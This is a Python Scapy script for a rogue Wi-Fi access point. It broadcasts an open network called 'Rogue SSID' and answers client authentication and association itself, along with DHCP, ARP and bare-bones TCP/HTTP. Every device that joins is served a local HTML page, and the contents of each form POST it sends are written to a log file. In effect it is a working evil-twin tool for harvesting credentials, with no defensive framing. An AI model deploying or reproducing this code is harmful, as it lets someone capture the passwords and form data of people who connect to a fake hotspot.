from scapy.all import *
import multiprocessing
import datetime


class Dot11EltRates(Packet):
    """
    Our own definition for the supported rates field
    """
    name = "802.11 Rates Information Element"
    # Our Test AP has the rates 6, 9, 12 (B), 18, 24, 36, 48 and 54, with 12
    # Mbps as the basic rate - which does not have to concern us.
    supported_rates = [0x82,0x84,0x8b,0x96,0x24,0x30,0x48,0x6c]
 
    fields_desc = [
        ByteField("ID", 1),
        ByteField("len", len(supported_rates))
        ]
 
    for index, rate in enumerate(supported_rates):
        fields_desc.append(ByteField("supported_rate{0}".format(
            index + 1), rate))


class Monitor:


	def __init__ (self, interface, home_html):

		self.interface = interface
		self.dot11_rates = Dot11EltRates()
		self.data_sended = False
		self.home_html = home_html



	def send_packet(self, packet, packet_type=None):

		if packet_type is None:
			send(packet)
		elif packet_type == "AssoReq":
			packet /= self.dot11_rates
			send(packet)
		else:
			print "Packet type uknown"

	def mac_to_bytes(self,mac):
		st = mac.replace(':','').decode('hex')
		return st


	def dhcp_server(self,packet,seen_sender):
		#print packet[DHCP].options
		if packet[DHCP].options[0][1] == 1:
			print "DHCP discover by " + packet[DHCP].options[4][1]
			dhcp_packet_offer = RadioTap()/Dot11(addr1='ff:ff:ff:ff:ff:ff',addr2='90:4c:e5:1b:f0:bf',addr3='90:4c:e5:1b:f0:bf',type="Data",subtype=0,FCfield='from-DS') / LLC(dsap=0xaa,ssap=0xaa,ctrl=0x03) / SNAP(OUI=0x000000,code=ETH_P_IP) / IP(src="192.168.0.1",dst="255.255.255.255") /UDP(sport=67,dport=68) /BOOTP(op=2,yiaddr="192.168.0.2",siaddr="192.168.0.1",giaddr="192.168.0.1",chaddr=self.mac_to_bytes(seen_sender),xid=packet[BOOTP].xid)
			dh = DHCP(options=[('message-type','offer')])/DHCP(options=[('subnet_mask','255.255.255.0')])/DHCP(options=[('server_id','192.168.0.1'),('end')]) 
			sendp(dhcp_packet_offer/dh)
		if packet[DHCP].options[0][1] == 3:
			print "DHCP request by " + packet[DHCP].options[6][1]
			dhcp_packet_ack = RadioTap() / Dot11(addr1='ff:ff:ff:ff:ff:ff',addr2='90:4c:e5:1b:f0:bf',addr3='90:4c:e5:1b:f0:bf',type="Data",subtype=0,FCfield='from-DS') / LLC(dsap=0xaa,ssap=0xaa,ctrl=0x03) / SNAP(OUI=0x000000,code=ETH_P_IP) / IP(src="192.168.0.1",dst="255.255.255.255") / UDP(sport=67,dport=68) / BOOTP(op=2,yiaddr="192.168.0.2",siaddr="192.168.0.1",giaddr="192.168.0.1",chaddr=self.mac_to_bytes(seen_sender),xid=packet[BOOTP].xid)
			dh2 = DHCP(options=[('message-type','ack')])/DHCP(options=[('subnet_mask','255.255.255.0')])/DHCP(options=[('server_id','192.168.0.1'),('end')])
			sendp(dhcp_packet_ack/dh2)
			print "Client %s fully connected" % packet[DHCP].options[6][1]

	def arp_server(self,packet,seen_sender):
		if packet[ARP].op == 1:
			arp_reply = RadioTap() / Dot11(addr1=seen_sender,addr2='90:4c:e5:1b:f0:bf',addr3='90:4c:e5:1b:f0:bf',type="Data",subtype=0,FCfield='from-DS') / LLC() / SNAP() / ARP(op='is-at',psrc='192.168.0.1',pdst='192.168.0.2',hwsrc='90:4c:e5:1b:f0:bf',hwdst=seen_sender)
			sendp(arp_reply)

	def tcp_server(self,packet,seen_sender):
		print "POST" in str(packet[TCP])
		print "related to:" + str(packet[TCP])
		client_port = packet[TCP].sport
		if packet[TCP].flags == 2:
			self.data_sended = False
			seqNr = packet[TCP].seq
			ackNr = packet[TCP].seq + 1
			ip = RadioTap() / Dot11(addr1=seen_sender,addr2='90:4c:e5:1b:f0:bf',addr3='90:4c:e5:1b:f0:bf',type="Data",subtype=0,FCfield='from-DS') / LLC() / SNAP()/ IP(src="192.168.0.1", dst="192.168.0.2")
			TCP_SYNACK = TCP(sport=80, dport=client_port, flags="SA", seq=seqNr,ack=ackNr,options=[('MSS',1460)])
			sendp(ip/TCP_SYNACK)
		elif packet[TCP].flags == 0x018 and "POST" not in str(packet[TCP]):
			seqNr = packet[TCP].ack
			ackNr = packet[TCP].seq + len(packet.load)
			packet = RadioTap() / Dot11(addr1=seen_sender,addr2='90:4c:e5:1b:f0:bf',addr3='90:4c:e5:1b:f0:bf',type="Data",subtype=0,FCfield='from-DS') / LLC() / SNAP()/ IP(src="192.168.0.1", dst="192.168.0.2")
			TCP_F = TCP(sport=80, dport=client_port, flags="PA", seq=seqNr,ack=ackNr,options=[('MSS',1460)])
			html = "HTTP/1.1 200 OK\x0d\x0aDate:Wed, 29 Sep 2010 20:19:05 GMT\x0d\x0aServer: TEST\x0d\x0aContent-Type: text/html;\x0d\x0a\x0d\x0a" + self.home_html
			sendp(packet/TCP_F/html)
			self.data_sended = True
		elif packet[TCP].flags == 0x010 and self.data_sended == True:
			seqNr = packet[TCP].ack
			ackNr = packet[TCP].seq 
			close_packet = RadioTap() / Dot11(addr1=seen_sender,addr2='90:4c:e5:1b:f0:bf',addr3='90:4c:e5:1b:f0:bf',type="Data",subtype=0,FCfield='from-DS') / LLC() / SNAP()/ IP(src="192.168.0.1", dst="192.168.0.2")
			TCP_C = TCP(sport=80, dport=client_port, flags="R", seq=seqNr,ack=0,options=[('MSS',1460)])
			sendp(close_packet/TCP_C)
		elif packet[TCP].flags == 0x011:
			seqNr = packet[TCP].ack
			ackNr = packet[TCP].seq + 1
			close_packet = RadioTap() / Dot11(addr1=seen_sender,addr2='90:4c:e5:1b:f0:bf',addr3='90:4c:e5:1b:f0:bf',type="Data",subtype=0,FCfield='from-DS') / LLC() / SNAP()/ IP(src="192.168.0.1", dst="192.168.0.2")
			TCP_FIN = TCP(sport=80, dport=client_port, flags="A", seq=seqNr,ack=ackNr,options=[('MSS',1460)])
			sendp(close_packet/TCP_FIN)
		elif packet[TCP].flags == 0x018 and "POST" in str(packet[TCP]):
			ts = str(datetime.datetime.now()).split(".")[0]
			ts = ts.split(":")[0] + ":" + ts.split(":")[1]
			print str(packet)
			print "this is a POST"
			file1 = open("html/log.txt","r")
			previous = file1.read()
			file1.close()
			if "\n" + "*"*200 +"\n\n" + ts + "\n" + str(packet.load) + "\n" + "*"*200 + "\n\n" in previous:
				return
			filex = open("html/log.txt","w")
			filex.write(previous + "\n" + "*"*200 +"\n\n" + ts + "\n" + str(packet.load) + "\n" + "*"*200 + "\n\n")
			filex.close()
			seqNr = packet[TCP].ack
			ackNr = packet[TCP].seq + len(packet.load)
			packet = RadioTap() / Dot11(addr1=seen_sender,addr2='90:4c:e5:1b:f0:bf',addr3='90:4c:e5:1b:f0:bf',type="Data",subtype=0,FCfield='from-DS') / LLC() / SNAP()/ IP(src="192.168.0.1", dst="192.168.0.2")
			TCP_A = TCP(sport=80, dport=client_port, flags="A", seq=seqNr,ack=ackNr,options=[('MSS',1460)])
			sendp(packet/TCP_A)

	def handle_frame(self,packet):
		seen_receiver = packet[Dot11].addr1
		seen_sender = packet[Dot11].addr2
		print seen_receiver + "  rcv"
		print seen_sender + "  snd"
		print "********"
		if seen_receiver == "90:4c:e5:1b:f0:bf" and packet.haslayer(TCP):
			print "tcp data"
			self.tcp_server(packet,seen_sender)
		if seen_receiver == "90:4c:e5:1b:f0:bf" and packet.haslayer(ARP):
			print "arp request"
			self.arp_server(packet,seen_sender)
		if seen_receiver == "90:4c:e5:1b:f0:bf" and packet.haslayer(DHCP):
			self.dhcp_server(packet,seen_sender)

		if seen_receiver == "90:4c:e5:1b:f0:bf" and packet.haslayer(Dot11AssoReq):
			print "huawei packet:\n"
			packet.show()
			print "this is an association"
			packet1 = Dot11(addr1=seen_sender,addr2='90:4c:e5:1b:f0:bf',addr3='90:4c:e5:1b:f0:bf') / Dot11AssoResp(cap=0x0401) #/ Dot11Elt(ID=0, info="{}".format("Cazz,cucuzzidd e ov"))
			self.send_packet(packet1,"AssoReq")
			print "Client " + seen_sender + " connected!"
		if seen_receiver == "90:4c:e5:1b:f0:bf" and packet.haslayer(Dot11Auth):
				print "huawei packet:\n"
				packet.show()
				print "it's me --> authentication"
				packet1 = Dot11(addr1=seen_sender,addr2="90:4c:e5:1b:f0:bf",addr3="90:4c:e5:1b:f0:bf") / Dot11Auth(algo=0, seqnum=0x0002,status=0x0000)
				packet1.show()
				self.send_packet(packet1)
				


	def mon(self):
		sniff(iface=self.interface, lfilter=lambda x: x.haslayer(Dot11Auth) or x.haslayer(Dot11AssoReq) or x.haslayer(IP) or x.haslayer(ARP),stop_filter=self.handle_frame)

def start_broadcast():

	netSSID = 'Rogue SSID' # network name
	iface = 'wlan0' # interface that will advertise the network

	dot11 = Dot11(type=0,subtype=8, addr1='ff:ff:ff:ff:ff:ff',addr2='90:4c:e5:1b:f0:bf',
				addr3='90:4c:e5:1b:f0:bf')
	beacon = Dot11Beacon(cap='ESS')  # add + privacy and then info about rsn for obtaining wep and wpa beacons
	essid = Dot11Elt(ID='SSID',info=netSSID,len=len(netSSID))
	rsn = Dot11Elt(ID='RSNinfo', info=(
	'\x01\x00'
	'\x00\x0f\xac\x02'
	'\x02\x00'
	'\x00\x0f\xac\x04'
	'\x00\x0f\xac\x02'
	'\x01\x00'
	'\x00\x0f\xac\x02'
	'\x00\x00'))
	dot11_rates = Dot11EltRates()
	frame = RadioTap()/dot11/beacon/essid/dot11_rates#/rsn
	frame.show()
	print("\nHexDump of frame:")
	hexdump(frame)
	#raw_input("\nPress enter to start broadcasting\n")

	sendp(frame, iface=iface, inter=0.100, loop=1,verbose=False)

def read_html(path):
	file = open(path,"r")
	html = file.read()
	file.close()
	return html

	
receive_process = multiprocessing.Process(target=start_broadcast)
receive_process.start()
monitor = Monitor("wlan0",read_html("html/home.html"))
monitor.mon()

